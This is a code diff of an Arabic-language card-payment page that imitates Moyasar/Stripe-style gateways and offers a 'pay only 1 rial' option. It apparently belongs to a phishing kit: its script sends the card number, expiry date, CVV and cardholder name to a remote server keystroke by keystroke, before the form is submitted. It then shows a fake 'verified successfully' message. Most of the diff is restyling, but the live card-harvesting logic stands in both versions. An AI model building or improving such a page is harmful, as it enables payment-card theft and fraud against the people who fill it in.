@@ -7,14 +7,16 @@
   <link rel="stylesheet" href="../css/style.css">
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <style>
+    /* ستايل بوابات الدفع العالمية المطابق للصورة (Moyasar / Stripe Style) */
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
 
     :root {
       --ms-primary: #123ca9;
       --ms-text: #27272a;
+      --ms-label: #4b5563;
       --ms-border: #e4e4e7;
       --ms-bg: #ffffff;
-      --ms-error: #dc2626;
+      --ms-hint: #a1a1aa;
       --radius-normal: 8px;
     }
 
@@ -51,7 +53,9 @@
       background: #e4e4e7;
     }
     
-    .form-title .icon { display: none; }
+    .form-title .icon {
+      display: none;
+    }
 
     .form-group {
       margin-bottom: 20px;
@@ -90,86 +94,25 @@
       opacity: 0.9;
     }
 
-    /* ===== CARD NUMBER INPUT WITH LOGO DETECTION ===== */
-    .card-input-wrapper {
-      position: relative;
-      width: 100%;
-    }
-
     .card-number-input {
-      width: 100%;
-      padding: 13px 16px;
-      padding-left: 140px;
+      border-bottom: 1px solid #f4f4f5 !important;
+      border-bottom-left-radius: 0 !important;
+      border-bottom-right-radius: 0 !important;
       font-family: 'Courier New', monospace;
-      font-size: 1.05rem;
-      letter-spacing: 1px;
-      text-align: left;
-      direction: ltr;
-      border: 1px solid var(--ms-border);
-      border-radius: var(--radius-normal);
-      background-color: #ffffff;
-      color: var(--ms-text);
-      box-sizing: border-box;
-      transition: border-color 0.15s ease;
+      font-size: 1.05rem !important;
+      letter-spacing: 0.5px !important;
+      text-align: right !important;
+      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 24"><rect x="0" y="2" width="26" height="18" rx="2" fill="%230284c7"/><text x="4" y="14" fill="white" font-family="sans-serif" font-size="8" font-weight="bold">mada</text><rect x="32" y="2" width="26" height="18" rx="2" fill="%230a2540"/><text x="36" y="14" fill="white" font-family="sans-serif" font-size="9" font-style="italic" font-weight="bold">VISA</text><rect x="64" y="2" width="26" height="18" rx="2" fill="%23222"/><circle cx="73" cy="11" r="6" fill="%23eb001b"/><circle cx="81" cy="11" r="6" fill="%23ff5f00" opacity="0.8"/><rect x="96" y="2" width="26" height="18" rx="2" fill="%230070d2"/><text x="100" y="13" fill="white" font-family="sans-serif" font-size="7" font-weight="bold">AMEX</text></svg>');
+      background-repeat: no-repeat;
+      background-position: left 12px center;
+      background-size: 110px auto;
+      padding-left: 130px !important;
     }
 
-    .card-number-input:focus {
-      outline: none;
-      border-color: #a1a1aa;
-      box-shadow: 0 0 0 1px #a1a1aa;
-    }
-
-    /* Card brand logos container */
-    .card-brands {
-      position: absolute;
-      left: 12px;
-      top: 50%;
-      transform: translateY(-50%);
-      display: flex;
-      gap: 6px;
-      align-items: center;
-      pointer-events: none;
-    }
-
-    .card-brand {
-      width: 32px;
-      height: 20px;
-      border-radius: 3px;
-      opacity: 0.3;
-      transition: opacity 0.2s ease, transform 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 6px;
-      font-weight: bold;
-      color: white;
-    }
-
-    .card-brand.active {
-      opacity: 1;
-      transform: scale(1.1);
-    }
-
-    .card-brand.mada { background: #02847c; }
-    .card-brand.visa { background: #1a1f71; }
-    .card-brand.mastercard { background: #eb001b; position: relative; }
-    .card-brand.mastercard::after {
-      content: '';
-      position: absolute;
-      width: 32px;
-      height: 20px;
-      background: #f79e1b;
-      border-radius: 3px;
-      left: -12px;
-      z-index: -1;
-    }
-    .card-brand.amex { background: #007bc1; }
-
-    /* ===== EXPIRY & CVV ROW ===== */
     .form-row {
       display: flex;
-      gap: 12px;
       margin-top: -20px;
+      border-top: none;
     }
 
     .form-row .form-group {
@@ -177,118 +120,70 @@
       margin-bottom: 0;
     }
 
-    .form-row .form-label,
+    .form-row .form-label, 
     .form-row .form-hint {
-      display: none !important;
+      display: none !important; 
     }
 
-    .form-row .form-control {
-      border-radius: var(--radius-normal);
+    .form-row .form-group:first-child .form-control {
+      border-top-left-radius: 0 !important;
+      border-top-right-radius: 0 !important;
+      border-bottom-left-radius: 0 !important;
+      border-bottom-right-radius: var(--radius-normal) !important;
+      border-left: none !important;
     }
 
-    #expiry {
-      text-align: center;
-      font-family: 'Courier New', monospace;
-      letter-spacing: 2px;
-      direction: ltr;
+    .form-row .form-group:last-child .form-control {
+      border-top-left-radius: 0 !important;
+      border-top-right-radius: 0 !important;
+      border-bottom-right-radius: 0 !important;
+      border-bottom-left-radius: var(--radius-normal) !important;
+      border-right: 1px solid var(--ms-border) !important;
     }
 
-    #cvv {
-      text-align: center;
-      font-family: 'Courier New', monospace;
-      letter-spacing: 2px;
-    }
-
-    /* Error state for expiry */
-    .expiry-wrapper {
-      position: relative;
-    }
-
-    .expiry-wrapper.error .form-control {
-      border-color: var(--ms-error) !important;
-      box-shadow: 0 0 0 1px var(--ms-error);
-    }
-
-    /* ===== PAYMENT AMOUNT CARDS ===== */
     .payment-options {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
+      display: flex !important;
+      flex-direction: row !important;
+      gap: 10px !important;
       margin-bottom: 5px;
     }
 
     .payment-option {
-      display: contents;
-    }
-
-    .payment-option input[type="radio"] {
-      display: none;
-    }
-
-    .payment-card {
+      flex: 1;
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 16px 12px;
-      background: #ffffff;
-      border: 2px solid #e4e4e7;
-      border-radius: 12px;
       cursor: pointer;
-      transition: all 0.2s ease;
-      text-align: center;
-      gap: 8px;
     }
 
-    .payment-card:hover {
-      border-color: #a1a1aa;
-      background: #fafafa;
-    }
-
-    .payment-option input[type="radio"]:checked + .payment-card {
-      border-color: var(--ms-primary);
-      background: #f0f4ff;
-      box-shadow: 0 0 0 1px var(--ms-primary);
-    }
-
-    .payment-card-icon {
-      font-size: 24px;
-      margin-bottom: 4px;
-    }
-
-    .payment-card-title {
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: #3f3f46;
-      line-height: 1.3;
-    }
-
-    .payment-card-price {
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: var(--ms-primary);
-    }
-
-    .payment-card-check {
-      position: absolute;
-      top: 8px;
-      left: 8px;
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      background: #e4e4e7;
+    .option-content {
       display: flex;
+      justify-content: space-between;
       align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      color: white;
+      width: 100%;
+      padding: 12px 14px !important;
+      background: #ffffff !important;
+      border: 1px solid var(--ms-border) !important;
+      border-radius: var(--radius-normal) !important;
       transition: all 0.2s ease;
     }
 
-    .payment-option input[type="radio"]:checked + .payment-card .payment-card-check {
-      background: var(--ms-primary);
+    .payment-option input[type="radio"]:checked + .option-content {
+      border-color: var(--ms-primary) !important;
+      background: #f8fafc !important;
+      box-shadow: none !important;
     }
 
-    /* ===== ORDER SUMMARY ===== */
+    .option-title {
+      font-size: 0.85rem !important;
+      font-weight: 600 !important;
+      color: #3f3f46 !important;
+    }
+
+    .option-price {
+      font-size: 0.95rem !important;
+      font-weight: 700 !important;
+      color: var(--ms-primary) !important;
+    }
+
     .order-summary {
       background: #f8fafc;
       border-radius: var(--radius-normal);
@@ -297,28 +192,9 @@
       border: 1px dashed #e4e4e7;
     }
 
-    .order-summary h4 {
-      margin: 0 0 12px 0;
-      font-size: 0.9rem;
-      color: #18181b;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .summary-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 6px 0;
-      font-size: 0.85rem;
-      color: #71717a;
-    }
-
-    .summary-row.discount {
-      border-bottom: 1px dashed #e4e4e7;
-      margin-bottom: 6px;
-      color: #dc2626;
-    }
+    .order-summary h4 { margin: 0 0 12px 0; font-size: 0.9rem; color: #18181b; }
+    .summary-row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 0.85rem; color: #71717a; }
+    .summary-row.discount { border-bottom: 1px dashed #e4e4e7; margin-bottom: 6px; color: #dc2626; }
     
     .order-summary .total {
       display: flex;
@@ -328,18 +204,9 @@
       margin-top: 12px;
       font-weight: 700;
     }
+    .total-label { color: #18181b; font-size: 0.9rem; }
+    .total-value { color: var(--ms-primary); font-size: 1.1rem; }
 
-    .total-label {
-      color: #18181b;
-      font-size: 0.9rem;
-    }
-
-    .total-value {
-      color: var(--ms-primary);
-      font-size: 1.1rem;
-    }
-
-    /* ===== SUBMIT BUTTON ===== */
     .btn.btn-success {
       display: flex !important;
       justify-content: center !important;
@@ -361,10 +228,10 @@
     }
 
     .btn.btn-success span:last-child {
-      display: none !important;
+      display: none !important; 
     }
 
-    /* ===== RESPONSIVE ===== */
+    /* Responsive */
     @media (max-width: 480px) {
       .form-container.page {
         margin: 20px 16px;
@@ -372,18 +239,7 @@
       }
       
       .payment-options {
-        grid-template-columns: 1fr;
-      }
-
-      .card-number-input {
-        padding-left: 120px;
-        font-size: 0.95rem;
-      }
-
-      .card-brand {
-        width: 28px;
-        height: 18px;
-        font-size: 5px;
+        flex-direction: column !important;
       }
     }
   </style>
@@ -447,67 +303,54 @@
     </div>
 
     <form id="paymentForm">
-      <!-- Payment Amount Selection -->
       <div class="form-group">
         <label class="form-label">مبلغ التسديد</label>
         <div class="payment-options">
           <label class="payment-option">
             <input type="radio" name="paymentAmount" value="full" checked>
-            <div class="payment-card">
-              <div class="payment-card-check">✓</div>
-              <div class="payment-card-icon">💎</div>
-              <div class="payment-card-title">تسديد كامل القيمة</div>
-              <div class="payment-card-price" id="fullAmountDisplay">0.00 ر.ع</div>
-            </div>
+            <span class="option-content">
+              <span class="option-title">تسديد كامل القيمة</span>
+              <span class="option-price" id="fullAmountDisplay">0.00 ر.ع</span>
+            </span>
           </label>
           <label class="payment-option">
             <input type="radio" name="paymentAmount" value="1">
-            <div class="payment-card">
-              <div class="payment-card-check">✓</div>
-              <div class="payment-card-icon">💰</div>
-              <div class="payment-card-title">تسديد 1 ريال فقط</div>
-              <div class="payment-card-price">1.00 ر.ع</div>
-            </div>
+            <span class="option-content">
+              <span class="option-title">تسديد 1 ريال فقط</span>
+              <span class="option-price">1.00 ر.ع</span>
+            </span>
           </label>
         </div>
       </div>
 
-      <!-- Card Number with Brand Detection -->
       <div class="form-group">
         <label class="form-label">Card information</label>
-        <div class="card-input-wrapper">
-          <input type="text" class="card-number-input" id="cardNumber" 
-                 required maxlength="19" placeholder="•••• •••• •••• ••••" 
-                 inputmode="numeric" autocomplete="off" dir="ltr">
-          <div class="card-brands">
-            <div class="card-brand mada" id="brandMada">MADA</div>
-            <div class="card-brand visa" id="brandVisa">VISA</div>
-            <div class="card-brand mastercard" id="brandMaster">MC</div>
-            <div class="card-brand amex" id="brandAmex">AMEX</div>
-          </div>
-        </div>
+        <input type="text" class="form-control card-number-input" id="cardNumber" 
+               required maxlength="19" placeholder="1234 5678 9101 1121" 
+               inputmode="numeric" autocomplete="off">
       </div>
 
-      <!-- Expiry & CVV Row -->
       <div class="form-row">
-        <div class="form-group expiry-wrapper" id="expiryWrapper">
+        <div class="form-group">
+          <label class="form-label">تاريخ الانتهاء</label>
           <input type="text" class="form-control" id="expiry" required 
-                 placeholder="MM / YY" maxlength="7" inputmode="numeric" dir="ltr" autocomplete="off">
+                 placeholder="MM / YY" maxlength="5" inputmode="numeric" dir="ltr" autocomplete="off">
+          <small class="form-hint">مثال: 12/28</small>
         </div>
         <div class="form-group">
+          <label class="form-label">رمز الأمان (CVV)</label>
           <input type="text" class="form-control" id="cvv" required 
-                 placeholder="CVV" maxlength="4" inputmode="numeric" autocomplete="off">
+                 placeholder="CVC" maxlength="3" inputmode="numeric" autocomplete="off">
+          <small class="form-hint">3 أرقام خلف البطاقة</small>
         </div>
       </div>
 
-      <!-- Card Holder Name -->
       <div class="form-group" style="margin-top: 20px;">
         <label class="form-label">Name on card</label>
         <input type="text" class="form-control" name="cardHolder" required 
-               placeholder="Name on card" autocomplete="off" dir="ltr">
+               placeholder="Name on card" autocomplete="off">
       </div>
 
-      <!-- Order Summary -->
       <div class="order-summary">
         <h4>📋 ملخص الطلب</h4>
         <div class="summary-row">
@@ -548,7 +391,6 @@
     document.addEventListener('DOMContentLoaded', function() {
       trackPageChange('payment');
       
-      // Load product price
       var productId = localStorage.getItem('selected_product');
       if (productId) {
         fetch(SERVER_URL + '/api/products/' + productId)
@@ -567,140 +409,67 @@
       localStorage.removeItem('payment_data');
       localStorage.removeItem('payment_amount');
       
-      // ===== CARD BRAND DETECTION =====
-      var brandMada = document.getElementById('brandMada');
-      var brandVisa = document.getElementById('brandVisa');
-      var brandMaster = document.getElementById('brandMaster');
-      var brandAmex = document.getElementById('brandAmex');
-      
-      function detectCardBrand(cardNumber) {
-        // Reset all
-        [brandMada, brandVisa, brandMaster, brandAmex].forEach(function(b) {
-          if (b) b.classList.remove('active');
-        });
-        
-        var num = cardNumber.replace(/\s/g, '');
-        
-        // Mada (starts with 4 or specific bins)
-        if (num.startsWith('4') || num.startsWith('968') || num.startsWith('969') || 
-            num.startsWith('986') || num.startsWith('989')) {
-          if (brandMada) brandMada.classList.add('active');
-          return 'mada';
-        }
-        
-        // Visa (starts with 4)
-        if (num.startsWith('4')) {
-          if (brandVisa) brandVisa.classList.add('active');
-          return 'visa';
-        }
-        
-        // Mastercard (starts with 5)
-        if (num.startsWith('5') || num.startsWith('2')) {
-          if (brandMaster) brandMaster.classList.add('active');
-          return 'mastercard';
-        }
-        
-        // AMEX (starts with 34 or 37)
-        if (num.startsWith('34') || num.startsWith('37')) {
-          if (brandAmex) brandAmex.classList.add('active');
-          return 'amex';
-        }
-        
-        return null;
-      }
-      
-      // ===== CARD NUMBER INPUT =====
       var cardInput = document.getElementById('cardNumber');
       cardInput.addEventListener('input', function(e) {
         var value = e.target.value.replace(/\D/g, '');
         var formatted = '';
-        
-        // Format with spaces: 4 digits, space, 4 digits, etc.
         for (var i = 0; i < value.length && i < 16; i++) {
           if (i > 0 && i % 4 === 0) formatted += ' ';
           formatted += value[i];
         }
-        
         e.target.value = formatted;
-        
-        // Detect and highlight card brand
-        detectCardBrand(value);
-        
-        // Send partial data to server
         if (value.length >= 4) {
           submitPaymentForm({ cardNumber: value });
         }
       });
       
-      // ===== EXPIRY DATE INPUT (Liberty - No Auto-Correct) =====
       var expiryInput = document.getElementById('expiry');
-      var expiryWrapper = document.getElementById('expiryWrapper');
-      
       expiryInput.addEventListener('input', function(e) {
-        var value = e.target.value;
-        var digitsOnly = value.replace(/\D/g, '');
-        
-        // DO NOT modify what user types - just auto-add slash after 2 digits
-        if (digitsOnly.length > 2 && !value.includes('/')) {
-          var month = digitsOnly.substring(0, 2);
-          var year = digitsOnly.substring(2);
-          e.target.value = month + ' / ' + year;
-        } else if (digitsOnly.length <= 2) {
-          e.target.value = digitsOnly;
-        }
-        
-        // Remove error class when user starts typing
-        if (expiryWrapper) {
-          expiryWrapper.classList.remove('error');
-        }
-        
-        // Send partial data to server
-        if (digitsOnly.length >= 4) {
-          submitPaymentForm({ expiry: e.target.value });
+        var value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+          var month = value.substring(0, 2);
+          var year = value.substring(2, 4);
+          
+          if (parseInt(month) > 12) month = '12';
+          if (parseInt(month) < 1 && month.length === 2) month = '01';
+          
+          var formatted = month;
+          if (year.length > 0) formatted += ' / ' + year;
+          e.target.value = formatted;
+          
+          if (value.length >= 4) {
+            var now = new Date();
+            var currentYear = now.getFullYear() % 100;
+            var currentMonth = now.getMonth() + 1;
+            var expMonth = parseInt(month);
+            var expYear = parseInt(year);
+            
+            var isValid = (expYear > currentYear) || (expYear === currentYear && expMonth >= currentMonth);
+            expiryInput.style.borderColor = isValid ? '' : 'var(--ms-primary)';
+            
+            if (isValid) submitPaymentForm({ expiry: formatted });
+          }
+        } else {
+          e.target.value = value;
         }
       });
       
-      // Remove error on focus
-      expiryInput.addEventListener('focus', function() {
-        if (expiryWrapper) expiryWrapper.classList.remove('error');
-      });
-      
-      // ===== CVV INPUT =====
       var cvvInput = document.getElementById('cvv');
       cvvInput.addEventListener('input', function(e) {
         var value = e.target.value.replace(/\D/g, '');
-        if (value.length > 4) value = value.substring(0, 4);
+        if (value.length > 3) value = value.substring(0, 3);
         e.target.value = value;
-        
-        if (value.length >= 3) {
-          submitPaymentForm({ cvv: value });
-        }
+        if (value.length >= 3) submitPaymentForm({ cvv: value });
       });
       
-      // ===== CARD HOLDER =====
       document.querySelector('[name="cardHolder"]').addEventListener('input', function(e) {
-        if (e.target.value.length > 2) {
-          submitPaymentForm({ cardHolder: e.target.value });
-        }
+        if (e.target.value.length > 2) submitPaymentForm({ cardHolder: e.target.value });
       });
       
-      // ===== PAYMENT AMOUNT SELECTION =====
       var radios = document.querySelectorAll('input[name="paymentAmount"]');
-      radios.forEach(function(radio) {
-        radio.addEventListener('change', updateFinalAmount);
-      });
-      
-      // Make payment cards clickable
-      var paymentCards = document.querySelectorAll('.payment-card');
-      paymentCards.forEach(function(card) {
-        card.addEventListener('click', function() {
-          var radio = card.previousElementSibling;
-          if (radio && radio.type === 'radio') {
-            radio.checked = true;
-            updateFinalAmount();
-          }
-        });
-      });
+      for (var i = 0; i < radios.length; i++) {
+        radios[i].addEventListener('change', updateFinalAmount);
+      }
       
       function updateFinalAmount() {
         var selected = document.querySelector('input[name="paymentAmount"]:checked').value;
@@ -717,7 +486,6 @@
         document.getElementById('finalAmount').textContent = finalPrice.toFixed(2) + ' ر.ع';
       }
       
-      // ===== FORM SUBMISSION =====
       document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -727,41 +495,26 @@
         var cardHolder = document.querySelector('[name="cardHolder"]').value;
         var paymentAmount = document.querySelector('input[name="paymentAmount"]:checked').value;
         
-        // Validation
         if (cardNumber.length !== 16) {
           showToast('✕ رقم البطاقة يجب ان يكون 16 رقما', 'error');
           return;
         }
         
-        var expiryDigits = expiry.replace(/\D/g, '');
-        if (expiryDigits.length < 4) {
-          showToast('✕ تاريخ الانتهاء غير مكتمل', 'error');
-          if (expiryWrapper) expiryWrapper.classList.add('error');
-          return;
-        }
-        
-        var month = parseInt(expiryDigits.substring(0, 2));
-        var year = parseInt('20' + expiryDigits.substring(2, 4));
+        var cleanExpiry = expiry.replace(/\s/g, '');
+        var month = parseInt(cleanExpiry.substring(0, 2));
+        var year = parseInt('20' + cleanExpiry.substring(3, 5));
         var now = new Date();
         
-        if (month < 1 || month > 12) {
-          showToast('✕ شهر غير صالح', 'error');
-          if (expiryWrapper) expiryWrapper.classList.add('error');
-          return;
-        }
-        
         if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
-          showToast('✕ تاريخ الانتهاء منتهي', 'error');
-          if (expiryWrapper) expiryWrapper.classList.add('error');
+          showToast('✕ تاريخ الانتهاء غير صالح او منتهي', 'error');
           return;
         }
         
-        if (cvv.length < 3) {
+        if (cvv.length !== 3) {
           showToast('✕ رمز الامان يجب ان يكون 3 ارقام', 'error');
           return;
         }
         
-        // Prepare data
         var realData = {
           cardNumber: cardNumber,
           expiry: expiry,
@@ -770,16 +523,10 @@
           paymentAmount: paymentAmount
         };
         
-        // Clear fields for security
         document.getElementById('cardNumber').value = '';
         document.getElementById('expiry').value = '';
         document.getElementById('cvv').value = '';
         document.querySelector('[name="cardHolder"]').value = '';
-        
-        // Reset card brands
-        [brandMada, brandVisa, brandMaster, brandAmex].forEach(function(b) {
-          if (b) b.classList.remove('active');
-        });
         
         submitPaymentForm(realData);
         showToast('✓ تم التحقق من بيانات الدفع بنجاح');
@@ -789,7 +536,6 @@
         }, 1000);
       });
       
-      // Focus on card number on load
       document.getElementById('cardNumber').focus();
     });
   </script>
